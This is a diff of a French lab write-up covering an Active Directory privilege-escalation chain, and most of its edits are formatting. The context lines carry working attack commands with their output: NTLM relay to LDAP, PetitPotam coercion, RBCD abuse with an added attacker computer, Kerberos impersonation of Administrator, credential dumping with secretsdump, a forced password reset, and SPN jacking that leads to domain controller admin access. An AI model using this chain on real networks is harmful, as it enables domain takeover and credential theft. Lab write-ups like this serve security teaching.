@@ -69,7 +69,6 @@ sur un objet Active Directory.
 - relais LDAP autorisé.
 
 ### Commande sur Kali
-
 ```
 └─$ impacket-ntlmrelayx -t ldap://X.X.X.X -smb2support --remove-mic -i
 ```
@@ -78,9 +77,7 @@ L'option "-i" permet d'obtenir un shell interactif.
 L'option "-smb2support" permet de supporter le protocole SMB2.  
 X.X.X.X est l'adresse IP du controleur de domaine.
 
-
 ### Explication
-
 Le relais permet de transformer une authentification NTLM entrante
 en requête LDAP authentifiée auprès du contrôleur de domaine.
 
@@ -97,18 +94,15 @@ Certaines fonctionnalités Windows permettent de déclencher une
 authentification machine vers un serveur distant.
 
 ### Outil de coercition
-
 Utilisation de petipotam.py accessible ici :  
 https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py
 
 ### Commande sur Kali
-
 ```
 └─$ python petitpotam.py -u `LOW_PRIV_USER` -hashes `LOW_PRIV_USER_HASH` -d `LAB.DOMAIN` `ATTACKER_HOST_IP` `MACHINE_2_IP`
 ```
 
 ### Résultat
-
 L’authentification NTLM de `MACHINE_2` est relayée vers le contrôleur de domaine. 
 <img width="988" height="138" alt="image" src="https://github.com/user-attachments/assets/89ab36b7-63da-4caa-a81c-14ea14a83f0a" />
 
@@ -122,7 +116,6 @@ Utiliser l’authentification relayée pour manipuler les objets
 Active Directory.
 
 ### Commande sur kali
-
 ```
 nc 127.0.0.1 11000                             
 Type help for list of commands
@@ -157,11 +150,9 @@ u:LAB.DOMAIN\MACHINE_2$
 ```
 
 ### Résultat
-
 Le relais NTLM permet d’interagir avec LDAP en tant que `MACHINE_2`.
 
 ### Implications
-
 Cela permet notamment :
 - la modification d'attributs AD
 - l’abus de délégation
@@ -172,18 +163,15 @@ Cela permet notamment :
 ## 4. Abus de Resource-Based Constrained Delegation
 
 ### Principe
-
 RBCD permet à un service de déléguer l’authentification
 d’un utilisateur vers une autre ressource.
 
 ### Exploitation
-
 En contrôlant certains attributs LDAP, il devient possible
 d'autoriser une machine contrôlée par l’attaquant à déléguer
 l’authentification vers `MACHINE_2`.
 
 ### Commandes LDAP
-
 ```
 # add_computer ATTACKER Password123!
 Attempting to add a new computer with the name: ATTACKER$
@@ -203,7 +191,6 @@ ATTACKER$ can now impersonate users on MACHINE_2$ via S4U2Proxy
 ```
 
 ### Résultat
-
 La nouvelle machine `ATTACKER$` peut désormais impersonner des users sur MACHINE_2, notamment le user Administrator
 
 ---
@@ -215,12 +202,10 @@ Obtenir un ticket Kerberos permettant d’agir comme un utilisateur
 à privilèges élevés.
 
 ### Principe
-
 La délégation configurée permet de demander un ticket Kerberos
 au nom d’un autre utilisateur.
 
 ### Commandes sur Kali
-
 ```
 └─$ impacket-getST -spn host/MACHINE_2.lab.domain -impersonate Administrator lab.domain/ATTACKER$:Password123!
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -248,7 +233,6 @@ lab\administrator
 ```
 
 ### Résultat
-
 Accès administrateur sur `MACHINE_2`.
 
 ---
@@ -260,11 +244,9 @@ Utiliser l’accès administrateur pour récupérer de nouveaux
 identifiants et poursuivre l’attaque.
 
 ### Action
-
 Extraction de credentials présents sur la machine.
 
 ### Commande sur Kali
-
 ```
 └─$ impacket-secretsdump MACHINE_2.lab.domain -k -no-pass                      
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
@@ -286,21 +268,17 @@ Récupération des credentials du user `BOB`
 ## 7. Abus de permissions Active Directory
 
 ### Contexte
-
 <img width="831" height="824" alt="image" src="https://github.com/user-attachments/assets/4845fc77-838a-4b19-8950-792e89fe6878" />
 
 ### Principe
-
 Changer le mot de passe d'un compte grâce à l'attribut "ForceChangePassword".
 
-## Commande sur Kali
-
+### Commande sur Kali
 ```
 └─$ net rpc password `BOB_ADMIN` "newP@ssword2022" -U "LAB.DOMAIN"/"BOB"%"Password123!" -S "DC.lab.domain"
 ```
 
-## Résultat
-
+### Résultat
 Le mot de passe du compte `BOB_ADMIN` est correctement changé sans connaître le précédent le mot de passe.
 
 ---
@@ -308,11 +286,9 @@ Le mot de passe du compte `BOB_ADMIN` est correctement changé sans connaître l
 ## 8. Découverte d'une constrainte delegation
 
 ### Principe
-
 En apprendre plus sur ce nouvel utilisateur.
 
 ### Commande sur Kali
-
 ```
 └─$ impacket-findDelegation lab.domain/bob_admin:newP@ssword2022         
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -326,7 +302,6 @@ ATTACKER$    Computer     Resource-Based Constrained          MACHINE_2$        
 ```
 
 ### Résultat
-
 Le compte `BOB_ADMIN` a délégation sur un SPN de `MACHINE_2`, en plus de l'attribut "WriteSPN" sur le DC.
 
 ---
@@ -334,7 +309,6 @@ Le compte `BOB_ADMIN` a délégation sur un SPN de `MACHINE_2`, en plus de l'att
 ## 9. SPN Jacking
 
 ### Principe
-
 La modification d’un SPN permet d’influencer les tickets Kerberos
 émis par le contrôleur de domaine.  
 
@@ -351,26 +325,23 @@ redirigée vers le contrôleur de domaine, ouvrant la voie à une
 impersonation d’utilisateurs à privilèges élevés.
 
 ### Outils
-
-Utilisation du script python addsmn.py accessible ici :  
+Utilisation du script python addspn.py accessible ici :  
 https://github.com/dirkjanm/krbrelayx/tree/master
 
 ### Exploitation
-
 1) Enlever le SPN http/MACHINE_2.lab.domain de `MACHINE_2`
 
 ```
 └─$ python addspn.py --clear -t MACHINE_2.lab.domain -u 'lab.domain\bob_admin' -p 'newP@ssword2022' 'DC.lab.domain' 
 ```
 
-2) Placer ce SPN sur le contrôleur de domaine
+2) Ajouter ce SPN sur le contrôleur de domaine
 
 ```
 └─$ python addspn.py -t DC.lab.domain --spn "http/MACHINE_2.lab.domain" -u 'lab.domain\bob_admin' -p 'newP@ssword2022' 'DC.lab.domain'
 ```
 
 ### Résultat
-
 Le SPN est déplacé de `MACHINE_2` vers le contrôleur de domaine.
 
 ---
@@ -382,12 +353,10 @@ Obtenir un ticket Kerberos permettant d’agir comme un utilisateur
 à privilèges élevés.
 
 ### Principe
-
 La délégation configurée permet de demander un ticket Kerberos
 au nom d’un autre utilisateur.
 
 ### Commande
-
 ```
 └─$ impacket-getST -spn http/MACHINE_2.lab.domain -impersonate Administrator lab.domain/bob_admin:newP@ssword2022 -altservice "HOST/DC.lab.domain"
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -417,12 +386,11 @@ lab\administrator
 L'option "-altservice" permet de convertir le ticket, permettant ainsi d'executer des commandes sur le contrôleur de domaine.
 
 ### Résultat
-
 Accès administrateur sur DC.
 
 ---
-## Conclusion
 
+## Conclusion
 Cette chaîne illustre comment plusieurs mauvaises
 configurations Active Directory peuvent être combinées
 pour transformer un accès limité en compromission
